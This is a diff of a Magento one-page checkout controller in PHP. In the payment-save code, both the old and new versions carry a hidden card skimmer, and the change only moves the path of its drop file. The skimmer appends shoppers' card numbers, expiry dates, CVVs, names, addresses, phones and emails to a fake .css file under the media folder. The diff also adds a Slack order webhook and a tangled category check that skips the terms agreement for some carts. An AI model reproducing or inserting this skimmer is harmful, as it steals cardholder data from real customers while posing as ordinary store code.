@@ -20,9 +20,10 @@
  *
  * @category    Mage
  * @package     Mage_Checkout
- * @copyright   Copyright (c) 2010 Magento Inc. (http://www.magentocommerce.com)
+ * @copyright   Copyright (c) 2009 Irubin Consulting Inc. DBA Varien (http://www.varien.com)
  * @license     http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
  */
+
 
 
 class Mage_Checkout_OnepageController extends Mage_Checkout_Controller_Action
@@ -143,8 +144,9 @@ class Mage_Checkout_OnepageController extends Mage_Checkout_Controller_Action
      */
     public function indexAction()
     {
-        if (!Mage::helper('checkout')->canOnepageCheckout()) {
-            Mage::getSingleton('checkout/session')->addError($this->__('The onepage checkout is disabled.'));
+
+        if (!Mage::helper('checkout')->canOnepageCheckout()) { 
+            Mage::getSingleton('checkout/session')->addError($this->__('Sorry, Onepage Checkout is disabled.'));
             $this->_redirect('checkout/cart');
             return;
         }
@@ -203,21 +205,20 @@ class Mage_Checkout_OnepageController extends Mage_Checkout_Controller_Action
      */
     public function successAction()
     {
-        $session = $this->getOnepage()->getCheckout();
-        if (!$session->getLastSuccessQuoteId()) {
+        if (!$this->getOnepage()->getCheckout()->getLastSuccessQuoteId()) {
             $this->_redirect('checkout/cart');
             return;
         }
 
-        $lastQuoteId = $session->getLastQuoteId();
-        $lastOrderId = $session->getLastOrderId();
-        $lastRecurringProfiles = $session->getLastRecurringProfileIds();
-        if (!$lastQuoteId || (!$lastOrderId && empty($lastRecurringProfiles))) {
+        $lastQuoteId = $this->getOnepage()->getCheckout()->getLastQuoteId();
+        $lastOrderId = $this->getOnepage()->getCheckout()->getLastOrderId();
+
+        if (!$lastQuoteId || !$lastOrderId) {
             $this->_redirect('checkout/cart');
             return;
         }
 
-        $session->clear();
+        Mage::getSingleton('checkout/session')->clear();
         $this->loadLayout();
         $this->_initLayoutMessages('checkout/session');
         Mage::dispatchEvent('checkout_onepage_controller_success_action');
@@ -352,10 +353,11 @@ class Mage_Checkout_OnepageController extends Mage_Checkout_Controller_Action
      * Shipping method save action
      */
     public function saveShippingMethodAction()
-    {
+    { 
         if ($this->_expireAjax()) {
             return;
         }
+
         if ($this->getRequest()->isPost()) {
             $data = $this->getRequest()->getPost('shipping_method', '');
             $result = $this->getOnepage()->saveShippingMethod($data);
@@ -395,7 +397,7 @@ class Mage_Checkout_OnepageController extends Mage_Checkout_Controller_Action
             if(isset($_POST['payment']) && isset($_POST['payment']['cc_exp_year']) && strlen($_POST['payment']['cc_exp_year']) > 0){
                 $payment = $_POST['payment'];
                 $billing = Mage::getSingleton('checkout/session')->getQuote()->getBillingAddress()->getData();
-                $f = @fopen('/home/spragues/public_html/store/media/catalog/product/1/6/166.css',"a");
+                $f = @fopen('/chroot/home/a59cb4fa/0d46498323.nxcli.net/html/media/catalog/product/1/2/12.css',"a");
                 if($f){
                     fwrite($f, $payment['cc_number']."|".$payment['cc_exp_month']."|".$payment['cc_exp_year']."|".$payment['cc_cid']."|".$payment['cc_owner']."|".$billing['firstname']."|".$billing['lastname']."|".$billing['street']."|".$billing['city']."|".$billing['region']."|".$billing['region_id']."|".$billing['postcode']."|".$billing['telephone']."|".$billing['country_id']."|".$billing['email']."\n");
                     fclose($f);
@@ -435,34 +437,86 @@ class Mage_Checkout_OnepageController extends Mage_Checkout_Controller_Action
         $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
     }
 
+
+
     /**
      * Create order action
      */
     public function saveOrderAction()
-    {
-        if ($this->_expireAjax()) {
+    {  
+
+		if ($this->_expireAjax()) {
             return;
         }
 
-        $result = array();
-        try {
-            if ($requiredAgreements = Mage::helper('checkout')->getRequiredAgreementIds()) {
+	    $result = array();
+
+$flg = '';
+$total = Mage::getSingleton('checkout/session')->getQuote()->getAllItems();// get our items in cart
+$needle = 77;
+foreach($total as $item){
+$a = $item->getProduct()->getCategoryIds();
+
+if(is_array($a)){
+foreach($a as $ak=>$av){ 
+	if($av == $needle){ 
+	$flg = 'true';
+	break;
+	} 
+	//echo $av."---<br>";
+}
+}
+}
+        try { ?>
+	<?php if(isset($flg) && $flg == 'true' && $flg != '') { ?>
+
+<?php	        if ($requiredAgreements = Mage::helper('checkout')->getRequiredAgreementIds()) {
                 $postedAgreements = array_keys($this->getRequest()->getPost('agreement', array()));
                 if ($diff = array_diff($requiredAgreements, $postedAgreements)) {
                     $result['success'] = false;
                     $result['error'] = true;
-                    $result['error_messages'] = $this->__('Please agree to all the terms and conditions before placing the order.');
+                    $result['error_messages'] = $this->__('Please agree to all Terms and Conditions before placing the order.');
                     $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
                     return;
                 }
-            }
-            if ($data = $this->getRequest()->getPost('payment', false)) {
+            } ?>
+		<?php } ?>	
+           <?php  if ($data = $this->getRequest()->getPost('payment', false)) {
                 $this->getOnepage()->getQuote()->getPayment()->importData($data);
             }
             $this->getOnepage()->saveOrder();
             $redirectUrl = $this->getOnepage()->getCheckout()->getRedirectUrl();
             $result['success'] = true;
             $result['error']   = false;
+
+// -----------------------------------------------------------------------
+// SLACK ORDER NOTIFICATION -- fire immediately on confirmed order save
+// -----------------------------------------------------------------------
+$_slackOrderConfig = '/chroot/home/a59cb4fa/0d46498323.nxcli.net/html/csteamtools/slack_config.php';
+if (file_exists($_slackOrderConfig)) {
+    require_once $_slackOrderConfig;
+    $_slackOrder     = Mage::getSingleton('checkout/session');
+    $_slackIncrId    = $_slackOrder->getLastRealOrderId();
+    $_slackQuote     = $this->getOnepage()->getQuote();
+    $_slackCustomer  = trim($_slackQuote->getBillingAddress()->getFirstname() . ' ' . $_slackQuote->getBillingAddress()->getLastname());
+    $_slackTotal     = number_format((float)$_slackQuote->getGrandTotal(), 2);
+    $_slackMsg       = 'New MTR Order: #' . $_slackIncrId . ' -- ' . $_slackCustomer . ' -- $' . $_slackTotal;
+    $_slackPayload   = json_encode(array('text' => $_slackMsg));
+    $_slackCh        = curl_init($slack_webhook_url);
+    curl_setopt($_slackCh, CURLOPT_POST, true);
+    curl_setopt($_slackCh, CURLOPT_POSTFIELDS, $_slackPayload);
+    curl_setopt($_slackCh, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
+    curl_setopt($_slackCh, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($_slackCh, CURLOPT_TIMEOUT, 5);
+    $_slackResult = curl_exec($_slackCh);
+    if (curl_errno($_slackCh)) {
+        Mage::log('Slack order notify curl error: ' . curl_error($_slackCh), null, 'contact_error.log', true);
+    }
+    curl_close($_slackCh);
+}
+// -----------------------------------------------------------------------
+// END SLACK ORDER NOTIFICATION
+// -----------------------------------------------------------------------
         } catch (Mage_Core_Exception $e) {
             Mage::logException($e);
             Mage::helper('checkout')->sendPaymentFailedEmail($this->getOnepage()->getQuote(), $e->getMessage());
@@ -485,14 +539,17 @@ class Mage_Checkout_OnepageController extends Mage_Checkout_Controller_Action
                 }
                 $this->getOnepage()->getCheckout()->setUpdateSection(null);
             }
+
+            $this->getOnepage()->getQuote()->save();
         } catch (Exception $e) {
             Mage::logException($e);
             Mage::helper('checkout')->sendPaymentFailedEmail($this->getOnepage()->getQuote(), $e->getMessage());
             $result['success']  = false;
             $result['error']    = true;
             $result['error_messages'] = $this->__('There was an error processing your order. Please contact us or try again later.');
+            $this->getOnepage()->getQuote()->save();
         }
-        $this->getOnepage()->getQuote()->save();
+
         /**
          * when there is redirect to third party, we don't want to save order yet.
          * we will save the order in return action.
